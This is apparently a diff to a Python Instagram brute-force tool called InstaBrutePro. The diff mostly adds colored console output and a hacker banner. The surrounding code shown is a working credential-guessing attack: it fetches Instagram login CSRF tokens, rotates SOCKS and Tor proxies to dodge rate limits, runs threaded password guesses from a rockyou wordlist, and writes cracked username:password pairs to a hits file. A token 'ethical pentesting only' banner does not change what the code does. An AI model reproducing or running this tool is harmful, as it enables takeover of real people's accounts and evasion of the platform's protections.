@@ -14,6 +14,25 @@ import socks
 import socket
 from queue import Queue
 
+# Colors
+class Colors:
+    RED = '\033[1;31m'
+    GREEN = '\033[1;32m'
+    YELLOW = '\033[1;33m'
+    CYAN = '\033[1;36m'
+    NC = '\033[0m'
+
+# Hacker Banner
+print(f"{Colors.RED}")
+print("  ____            _          ____            _       ___       ")
+print(" | __ ) _   _ ___| |__   ___| __ ) _ __ __ _| |__   |_ _|_ __  ")
+print(" |  _ \\| | | / __| '_ \\ / __|  _ \\| '__/ _` | '_ \\   | || '_ \\ ")
+print(" | |_) | |_| \\__ \\ |_) | (__| |_) | | | (_| | |_) |  | || | | |")
+print(" |____/ \\__,_/|___/_.__/ \\___|____/|_|  \\__,_|_.__/  |___|_| |_|")
+print(f"           {Colors.CYAN} InstaBrutePro v1.0 - by Soly {Colors.NC}")
+print(f"{Colors.YELLOW}[*] Elite Instagram Brute-Forcer for Ethical Pentesting Only{Colors.NC}")
+print(f"{Colors.RED}[!] Legal: Consent REQUIRED. Unauthorized use ILLEGAL.{Colors.NC}\n")
+
 # Config
 with open('config/instabrute_config.json', 'r') as f:
     CONFIG = json.load(f)
@@ -42,7 +61,7 @@ def get_proxies():
                 if line:
                     proxies.append(f"socks5://{line}")
     except FileNotFoundError:
-        pass
+        print(f"{Colors.RED}[!] Proxies file missing! Using Tor only.{Colors.NC}")
     random.shuffle(proxies)
     return proxies[:200]
 
@@ -55,10 +74,12 @@ def sort_proxies(proxies):
             return p
         except:
             return None
+    print(f"{Colors.YELLOW}[*] Sorting proxies...{Colors.NC}")
     with ThreadPoolExecutor(max_workers=50) as exec:
         working = [p for p in exec.map(test_proxy, proxies) if p]
     with open('proxies/working_proxies.txt', 'w') as f:
         f.write('\n'.join(working))
+    print(f"{Colors.GREEN}[+] {len(working)} working proxies saved!{Colors.NC}")
     return working
 
 def get_csrf(proxy=None):
@@ -70,6 +91,7 @@ def get_csrf(proxy=None):
     session.mount('http://', adapter)
     session.mount('https://', adapter)
     session.headers = {'User-Agent': UA}
+    print(f"{Colors.YELLOW}[*] Fetching CSRF token...{Colors.NC}")
     resp = session.get("https://www.instagram.com/accounts/login/")
     csrf = resp.cookies.get('csrftoken', '')
     session.close()
@@ -107,21 +129,21 @@ def try_password(username, password, proxy, csrf):
         time.sleep(DELAY + random.uniform(0, 0.5))
         if '"authenticated":true' in resp.text:
             with lock:
-                print(f"[+] CRACKED! {username}:{password}")
+                print(f"{Colors.GREEN}[+] CRACKED! {username}:{password}{Colors.NC}")
                 with open('hits/cracked.txt', 'a') as f:
                     f.write(f"{username}:{password}\n")
                 found = True
                 return True
         elif 'checkpoint_required' in resp.text:
-            print(f"[!] Checkpoint on {password} - Manual verify?")
+            print(f"{Colors.YELLOW}[!] Checkpoint on {password} - Manual verify?{Colors.NC}")
         elif '"spam":true' in resp.text:
-            print(f"[!] Rate limit - Rotate proxy")
+            print(f"{Colors.RED}[!] Rate limit - Rotating proxy{Colors.NC}")
             return False
         else:
-            print(f"[-] Fail: {password[:10]}...")
+            print(f"{Colors.CYAN}[-] Fail: {password[:10]}...{Colors.NC}")
         return False
     except Exception as e:
-        print(f"[!] Error: {e}")
+        print(f"{Colors.RED}[!] Error: {e}{Colors.NC}")
         return False
     finally:
         session.close()
@@ -135,53 +157,57 @@ def worker(queue, username, proxies, csrf):
 
 def main():
     global resume_line
-    parser = argparse.ArgumentParser(description="InstaBrutePro: Instagram Brute-Forcer")
-    parser.add_argument('-u', required=True, help='Username')
-    parser.add_argument('-w', default='wordlists/rockyou_sample.txt', help='Wordlist')
+    parser = argparse.ArgumentParser(description="InstaBrutePro: Elite Instagram Brute-Forcer by Soly")
+    parser.add_argument('-u', required=True, help='Target username')
+    parser.add_argument('-w', default='wordlists/rockyou_sample.txt', help='Wordlist path')
     parser.add_argument('-t', type=int, default=THREADS, help='Threads')
-    parser.add_argument('-r', action='store_true', help='Resume')
-    parser.add_argument('-p', default='proxies/working_proxies.txt', help='Proxies')
+    parser.add_argument('-r', action='store_true', help='Resume session')
+    parser.add_argument('-p', default='proxies/working_proxies.txt', help='Proxy file')
     parser.add_argument('-d', type=float, default=DELAY, help='Delay (s)')
     args = parser.parse_args()
 
     # Validate user
+    print(f"{Colors.YELLOW}[*] Validating username: {args.u}...{Colors.NC}")
     import subprocess
     result = subprocess.run(['python', 'validate_user.py', args.u], capture_output=True, text=True)
     if "Valid" not in result.stdout:
-        print("[-] Invalid username. Exiting.")
+        print(f"{Colors.RED}[-] Invalid username. Exiting.{Colors.NC}")
         return
 
     # Load wordlist
+    print(f"{Colors.YELLOW}[*] Loading wordlist: {args.w}...{Colors.NC}")
     with open(args.w, 'r', encoding='utf-8', errors='ignore') as f:
         words = [line.strip() for line in f if line.strip()]
     if args.r:
-        resume_line = int(input("Resume from line: ") or 0)
+        resume_line = int(input(f"{Colors.YELLOW}Resume from line (0 for start): {Colors.NC}") or 0)
         words = words[resume_line:]
 
     # Proxies
+    print(f"{Colors.YELLOW}[*] Loading proxies...{Colors.NC}")
     with open(args.p, 'r') as f:
         proxies = [line.strip() for line in f if line.strip()]
     if not proxies:
         proxies = get_proxies()
         proxies = sort_proxies(proxies)
-    print(f"[+] Loaded {len(words)} pw, {len(proxies)} proxies, {args.t} threads")
+    print(f"{Colors.GREEN}[+] Loaded {len(words)} passwords, {len(proxies)} proxies, {args.t} threads{Colors.NC}")
 
     # CSRF
     csrf = get_csrf(random.choice(proxies))
     if not csrf:
-        print("[-] Failed CSRF - Retry")
+        print(f"{Colors.RED}[-] Failed to fetch CSRF token - Retry{Colors.NC}")
         return
 
     queue = Queue()
     for word in words:
         queue.put(word)
 
+    print(f"{Colors.CYAN}[*] Starting brute-force on {args.u}... Buckle up!{Colors.NC}")
     with ThreadPoolExecutor(max_workers=args.t) as exec:
         futures = [exec.submit(worker, queue, args.u, proxies, csrf) for _ in range(args.t)]
         for future in futures:
             future.result()
 
-    print("[+] Done! Check hits/cracked.txt")
+    print(f"{Colors.GREEN}[+] Brute-force complete! Check hits/cracked.txt{Colors.NC}")
 
 if __name__ == "__main__":
     main()
